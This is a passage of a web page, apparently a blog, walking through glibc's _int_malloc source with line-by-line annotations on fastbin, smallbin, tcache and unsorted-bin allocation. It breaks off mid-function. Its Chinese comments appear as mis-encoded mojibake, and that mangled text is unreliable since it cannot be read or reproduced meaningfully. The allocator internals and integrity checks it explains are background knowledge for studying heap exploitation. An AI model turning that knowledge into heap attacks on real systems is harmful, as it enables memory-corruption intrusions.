class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *_int_malloc(mstate av, <span class="hljs-type">size_t</span> bytes) &#123;<br>    INTERNAL_SIZE_T nb;               <span class="hljs-comment">/* normalized request size */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx;                 <span class="hljs-comment">/* associated bin index */</span><br>    mbinptr bin;                      <span class="hljs-comment">/* associated bin */</span><br><br>    mchunkptr victim;                 <span class="hljs-comment">/* inspected/selected chunk */</span><br>    INTERNAL_SIZE_T size;             <span class="hljs-comment">/* its size */</span><br>    <span class="hljs-type">int</span> victim_index;                 <span class="hljs-comment">/* its bin index */</span><br><br>    mchunkptr remainder;              <span class="hljs-comment">/* remainder from a split */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;     <span class="hljs-comment">/* its size */</span><br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block;               <span class="hljs-comment">/* bit map traverser */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bit;                 <span class="hljs-comment">/* bit map traverser */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">map</span>;                 <span class="hljs-comment">/* current word of binmap */</span><br><br>    mchunkptr fwd;                    <span class="hljs-comment">/* misc temp for linking */</span><br>    mchunkptr bck;                    <span class="hljs-comment">/* misc temp for linking */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>    <span class="hljs-type">size_t</span> tcache_unsorted_count;	    <span class="hljs-comment">/* count of unsorted chunks processed */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       Convert request size to internal form by adding SIZE_SZ bytes</span><br><span class="hljs-comment">       overhead plus possibly more to obtain necessary alignment and/or</span><br><span class="hljs-comment">       to obtain a size of at least MINSIZE, the smallest allocatable</span><br><span class="hljs-comment">       size. Also, checked_request2size traps (returning 0) request sizes</span><br><span class="hljs-comment">       that are so large that they wrap around zero when padded and</span><br><span class="hljs-comment">       aligned.</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-comment">// æ£€æŸ¥è¯·æ±‚å¤§å°æ˜¯å¦åˆè§„</span><br>    <span class="hljs-comment">// è®¡ç®— bytes æ•°æ®éœ€è¦åˆ†é…çš„å†…å­˜å¤§å°ï¼Œå½“ bytes æ•°æ®çš„å¤§å°æ¯”æœ€å° chunk è¦è¿˜å°æ—¶,</span><br>    <span class="hljs-comment">// æŒ‰æœ€å° chunk çš„å¤§å°åˆ†é…ï¼›å½“ bytes æ•°æ®çš„å¤§å°æ¯”æœ€å° chunk å¤§æ—¶ï¼Œåˆ™åˆ†é…æ»¡è¶³å†…å­˜</span><br>    <span class="hljs-comment">// bytesæœ€å¤§ä¸è¶…è¿‡(unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE)</span><br>    checked_request2size (bytes, nb);<br><br>    <span class="hljs-comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span><br><span class="hljs-comment">       mmap.  */</span><br>    <span class="hljs-comment">// å¦‚æœæ²¡æœ‰å¯ç”¨çš„åˆ†é…åŒºï¼Œåˆ™è°ƒç”¨ sysmalloc è·å– chunk</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(av == <span class="hljs-literal">NULL</span>)) &#123;<br>        <span class="hljs-type">void</span> *p = sysmalloc(nb, av);<br>        <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">             *  static int perturb_byte;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">                static void</span><br><span class="hljs-comment">                alloc_perturb(char *p, size_t n) &#123;</span><br><span class="hljs-comment">                    if (__glibc_unlikely(perturb_byte))</span><br><span class="hljs-comment">                        memset(p, perturb_byte ^ 0xff, n);</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-comment">//å°† p å…¨éƒ¨è®¾ç½®ä¸º perturb_byte ,é»˜è®¤ä»€ä¹ˆä¹Ÿä¸åš</span><br>            alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">       This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">       can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment">     */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REMOVE_FB(fb, victim, pp)            \</span><br><span class="hljs-meta">  do                            \</span><br><span class="hljs-meta">    &#123;                            \</span><br><span class="hljs-meta">      victim = pp;                    \</span><br><span class="hljs-meta">      <span class="hljs-keyword">if</span> (victim == NULL)                \</span><br><span class="hljs-meta">    break;                        \</span><br><span class="hljs-meta">    &#125;                            \</span><br><span class="hljs-meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="hljs-meta">     != victim);                    \</span><br><span class="hljs-meta">    <span class="hljs-comment">// catomic_compare_and_exchange_val_rel_acq åŠŸèƒ½æ˜¯ å¦‚æœ*fbç­‰äºvictimï¼Œåˆ™å°†*fbå­˜å‚¨ä¸ºvictim-&gt;fdï¼Œè¿”å›victimï¼›</span></span><br>    <span class="hljs-comment">// å…¶ä½œç”¨æ˜¯ä»åˆšåˆšå¾—åˆ°çš„ç©ºé—²chunké“¾è¡¨æŒ‡é’ˆä¸­å–å‡ºç¬¬ä¸€ä¸ªç©ºé—²çš„chunk(victim)ï¼Œå¹¶å°†é“¾è¡¨å¤´è®¾ç½®ä¸ºè¯¥ç©ºé—²chunkçš„ä¸‹ä¸€ä¸ªchunk(victim-&gt;fd)</span><br><br>    <span class="hljs-comment">// å¦‚æœè§„èŒƒåŒ–åçš„å¤§å° å°äºç­‰äº fast bins ä¸­çš„æœ€å¤§ chunk å¤§å°</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast())) &#123;<br>        <span class="hljs-comment">// åœ¨ fastbin ä¸­æ‹¿åˆ°ç›¸åº”çš„ç´¢å¼•</span><br>        idx = fastbin_index (nb);<br>        <span class="hljs-comment">// å–å¾—å¯¹åº” fastbin ä¸­çš„ç¬¬ä¸€ä¸ª chunk</span><br>        mfastbinptr *fb = &amp;fastbin (av, idx);<br>        mchunkptr pp;<br>        victim = *fb;<br><br>        <span class="hljs-comment">// å¦‚æœè¯¥ fastbin ä¸­æœ‰å€¼</span><br>        <span class="hljs-keyword">if</span> (victim != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-comment">// å¦‚æœæ˜¯å•çº¿ç¨‹</span><br>            <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>                <span class="hljs-comment">// å–å‡º victim</span><br>                *fb = victim-&gt;fd;<br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-comment">// å–å‡º victim</span><br>                REMOVE_FB (fb, pp, victim);<br>            <span class="hljs-comment">// victim ä¸ä¸ºç©º</span><br>            <span class="hljs-keyword">if</span> (__glibc_likely(victim != <span class="hljs-literal">NULL</span>)) &#123;<br>                <span class="hljs-comment">// è®¡ç®— victim æ‰€å¯¹åº”çš„ fastbin ç´¢å¼•</span><br>                <span class="hljs-type">size_t</span> victim_idx = fastbin_index (chunksize(victim));<br>                <span class="hljs-comment">// æ‰€åˆ†é…ç»™çš„ victim çš„ victim_idx è¦å’Œ åˆšå¼€å§‹è®¡ç®—å‡ºçš„ idx ç›¸ç­‰</span><br>                <span class="hljs-keyword">if</span> (__builtin_expect(victim_idx != idx, <span class="hljs-number">0</span>))<br>                    malloc_printerr(<span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>);<br>                <span class="hljs-comment">// å•¥ä¹Ÿæ²¡å¹²</span><br>                check_remalloced_chunk (av, victim, nb);<br><span class="hljs-comment">// å¦‚æœä½¿ç”¨ tcache</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>                <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">               stash them in the tcache.  */</span><br>                <span class="hljs-comment">// å–å¾—å¯¹åº”å¤§å°çš„ tcache idx</span><br>                <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>                <span class="hljs-comment">// æ£€æŸ¥ tcache</span><br>                <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>              &#123;<br>                mchunkptr tc_victim;<br><br>                <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span><br>                <span class="hljs-comment">// tc_idx æ‰€å¯¹åº”çš„ entry æœªæ»¡ï¼Œ ä¸”ç›¸åº”å¤§å°çš„ fastbin è¿˜æœ‰å€¼</span><br>                <span class="hljs-comment">// å°±æŠŠ fastbin ä¸­çš„å€¼ç§»è‡³ tcache bin ä¸­ï¼Œç›´åˆ° tcache å·²æ»¡</span><br>                <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>                   &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>)<br>                  &#123;<br>                    <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>                        *fb = tc_victim-&gt;fd;<br>                    <span class="hljs-keyword">else</span><br>                  &#123;<br>                    REMOVE_FB (fb, pp, tc_victim);<br>                    <span class="hljs-keyword">if</span> (__glibc_unlikely (tc_victim == <span class="hljs-literal">NULL</span>))<br>                      <span class="hljs-keyword">break</span>;<br>                  &#125;<br>                    <span class="hljs-comment">// å°† fast bin ä¸­çš„ chunk æ’å…¥ tcache bin ä¸­</span><br>                    tcache_put (tc_victim, tc_idx);<br>                  &#125;<br>              &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>                <span class="hljs-comment">// æ‹¿åˆ°ç”¨æˆ·æŒ‡é’ˆ</span><br>                <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>                <span class="hljs-comment">// å°† p å…¨éƒ¨è®¾ç½®ä¸º perturb_byte ,é»˜è®¤ä»€ä¹ˆä¹Ÿä¸åš</span><br>                alloc_perturb(p, bytes);<br>                <span class="hljs-comment">// è¿”å›</span><br>                <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">       hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">       (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">       processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">       anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">// å¦‚æœè§„èŒƒåŒ–åçš„å¤§å° åœ¨ samllbin çš„åºåˆ—ä¹‹ä¸­</span><br>    <span class="hljs-keyword">if</span> (in_smallbin_range (nb)) &#123;<br>        <span class="hljs-comment">// æ‹¿åˆ° ç›¸åº”çš„ç´¢å¼•</span><br>        idx = smallbin_index (nb);<br>        <span class="hljs-comment">// åœ¨ arena ä¸Šæ‰¾åˆ°ç›¸åº”çš„ä½ç½®</span><br>        bin = bin_at (av, idx);<br>        <span class="hljs-comment">// è¡¨æ˜ è¯¥ bin ä¸­æœ‰å€¼</span><br>        <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin) &#123;<br>            <span class="hljs-comment">// æ‹¿åˆ° victim çš„ bk</span><br>            bck = victim-&gt;bk;<br>            <span class="hljs-comment">// éªŒè¯</span><br>            <span class="hljs-keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))<br>                malloc_printerr(<span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">              #define set_inuse_bit_at_offset(p, s)                          \</span><br><span class="hljs-comment">              (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span><br><span class="hljs-comment">            */</span><br>            <span class="hljs-comment">// è®¾ç½® victim ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ª chunk çš„ prev_inuse ä½</span><br>            set_inuse_bit_at_offset (victim, nb);<br>            <span class="hljs-comment">// æ‹¿å‡º victim</span><br>            bin-&gt;bk = bck;<br>            bck-&gt;fd = bin;<br><br>            <span class="hljs-comment">// è®¾ç½® non_main_arena</span><br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                set_non_main_arena (victim);<br><br>            <span class="hljs-comment">// å•¥ä¹Ÿæ²¡å¹²</span><br>            check_malloced_chunk (av, victim, nb);<br><br>            <span class="hljs-comment">// å’Œä¹‹å‰çš„ä¸€æ ·</span><br>            <span class="hljs-comment">// å¦‚æœå¯¹åº”çš„ tcache bin æœªæ»¡ï¼Œ åˆ™å°† small bin ä¸­çš„å€¼ä¸€ä¸ªä¸€ä¸ªçš„ç§»è¿‡å»</span><br>            <span class="hljs-comment">// ç›´è‡³å¯¹åº”çš„ tcache bin å·²æ»¡</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>            <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">               stash them in the tcache.  */</span><br>            <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>            <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>              &#123;<br>                mchunkptr tc_victim;<br><br>                <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>                <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>                   &amp;&amp; (tc_victim = last (bin)) != bin)<br>              &#123;<br>                <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>                  &#123;<br>                    bck = tc_victim-&gt;bk;<br>                    set_inuse_bit_at_offset (tc_victim, nb);<br>                    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                  set_non_main_arena (tc_victim);<br>                    bin-&gt;bk = bck;<br>                    bck-&gt;fd = bin;<br><br>                    tcache_put (tc_victim, tc_idx);<br>                      &#125;<br>              &#125;<br>              &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>            alloc_perturb(p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           If this is a large request, consolidate fastbins before continuing.</span><br><span class="hljs-comment">           While it might look excessive to kill all fastbins before</span><br><span class="hljs-comment">           even seeing if there is space available, this avoids</span><br><span class="hljs-comment">           fragmentation problems normally associated with fastbins.</span><br><span class="hljs-comment">           Also, in practice, programs tend to have runs of either small or</span><br><span class="hljs-comment">           large requests, but less often mixtures, so consolidation is not</span><br><span class="hljs-comment">           invoked all that often in most programs. And the programs that</span><br><span class="hljs-comment">           it is called frequently in otherwise tend to fragment.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// å°±å‰© large bin äº†</span><br>    <span class="hljs-keyword">else</span> &#123;<br>        idx = largebin_index (nb);<br>        <span class="hljs-comment">// å¦‚æœè¯¥ arena ä¸­å­˜åœ¨ fastbin åˆ™è°ƒç”¨ malloc_consolidate åˆå¹¶</span><br>        <span class="hljs-keyword">if</span> (atomic_load_relaxed(&amp;av-&gt;have_fastchunks))<br>            malloc_consolidate(av);<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       Process recently freed or remaindered chunks, taking one only if</span><br><span class="hljs-comment">       it is exact fit, or, if this a small request, the chunk is remainder from</span><br><span class="hljs-comment">       the most recent non-exact fit.  Place other traversed chunks in</span><br><span class="hljs-comment">       bins.  Note that this step is the only place in any routine where</span><br><span class="hljs-comment">       chunks are placed in bins.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       The outer loop here is needed because we might not realize until</span><br><span class="hljs-comment">       near the end of malloc that we should have consolidated, so must</span><br><span class="hljs-comment">       do so and retry. This happens at most once, and only when we would</span><br><span class="hljs-comment">       otherwise need to expand memory to service a &quot;small&quot; request.</span><br><span class="hljs-comment">     */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>    INTERNAL_SIZE_T tcache_nb = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//è·å– nb å¯¹åº”å¤§å°çš„ tcache çš„ idx</span><br>    <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>    <span class="hljs-comment">//  tcache å­˜åœ¨ä¸”ä¸‹æ ‡ idx åœ¨èŒƒå›´å†…</span><br>    <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>      tcache_nb = nb;<br>    <span class="hljs-type">int</span> return_cached = <span class="hljs-number">0</span>;<br><br>    tcache_unsorted_count = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">// å¤„ç† unsorted bin</span><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// unsorted bin ä¸­æœ‰å€¼ï¼Œä¸”ä¸æ˜¯ arena æœ¬èº«</span><br>        <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>        &#123;<br>            <span class="hljs-comment">// ä» bk å¼€å§‹</span><br>            bck = victim-&gt;bk;<br>            <span class="hljs-comment">// victim çš„ å¤§å° ä¸èƒ½å°äº 2 * SIZE_SZ</span><br>            <span class="hljs-comment">// ä¸”ä¸èƒ½å¤§äº av-&gt;system_mem</span><br>            <span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask (victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>                || __builtin_expect(chunksize_nomask (victim)<br>                                    &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>                malloc_printerr(<span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>);<br>            <span class="hljs-comment">// è®¡ç®—è¯¥å— æ ‡å‡†åŒ– åçš„å¤§å°</span><br>            size = chunksize (victim);<br><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">               If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">               only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">               runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">               exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">               no exact fit for a small chunk.</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-comment">//  å¦‚æœè¯·æ±‚çš„å¤§å°åœ¨ smallbin åºåˆ—ä¹‹ä¸­</span><br>            <span class="hljs-comment">//  unsorted bin ä¸­åªæœ‰è¿™ä¸€ä¸ª chunk</span><br>            <span class="hljs-comment">// å¹¶ä¸”è¯¥ victim æ˜¯ last remainder chunk</span><br>            <span class="hljs-comment">// ä¸”è¯¥å—çš„å¤§å°è¦å¤§äºè¯·æ±‚çš„å¤§å°åŠ  MINSIZE</span><br>            <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>                bck == unsorted_chunks (av) &amp;&amp;<br>            victim == av-&gt;last_remainder &amp;&amp;<br>            (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>            &#123;<br>                <span class="hljs-comment">/* split and reattach remainder */</span><br>                <span class="hljs-comment">// åˆ‡å‰² remainder</span><br>                remainder_size = size - nb;<br>                remainder = chunk_at_offset (victim, nb);<br>                <span class="hljs-comment">// æŠŠåˆ‡å‰²åçš„ remainder åŠ å…¥ unsorted bin ä¸­</span><br>                unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>                <span class="hljs-comment">// è®°å½•æ–°å€¼</span><br>                av-&gt;last_remainder = remainder;<br>                <span class="hljs-comment">// è¿›è¡Œé“¾æ¥</span><br>                remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>                <span class="hljs-comment">// å¦‚æœ remainder_size çš„å€¼åœ¨ large bin ä¸­</span><br>                <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size)) &#123;<br>                    <span class="hljs-comment">// fd_nextsize,fd_nextsizeæ¸…é›¶</span><br>                    remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                    remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                &#125;<br>                <span class="hljs-comment">// #define set_head(p, s)       ((p)-&gt;mchunk_size = (s)</span><br>                <span class="hljs-comment">// è®¾ç½® victim çš„ size æ ‡å¿—ä½</span><br>                set_head (victim, nb | PREV_INUSE |<br>                                  (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                <span class="hljs-comment">// è®¾ç½® remainder çš„ size æ ‡å¿—ä½</span><br>                set_head (remainder, remainder_size | PREV_INUSE);<br>                <span class="hljs-comment">// #define set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span><br>                <span class="hljs-comment">// è®¾ç½® remainder çš„ä¸‹ä¸€ä¸ª chunk çš„ prev_size ä½</span><br>                set_foot (remainder, remainder_size);<br><br>                <span class="hljs-comment">// å•¥ä¹Ÿæ²¡å¹²</span><br>                check_malloced_chunk (av, victim, nb);<br>                <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>                alloc_perturb(p, bytes);<br>                <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>            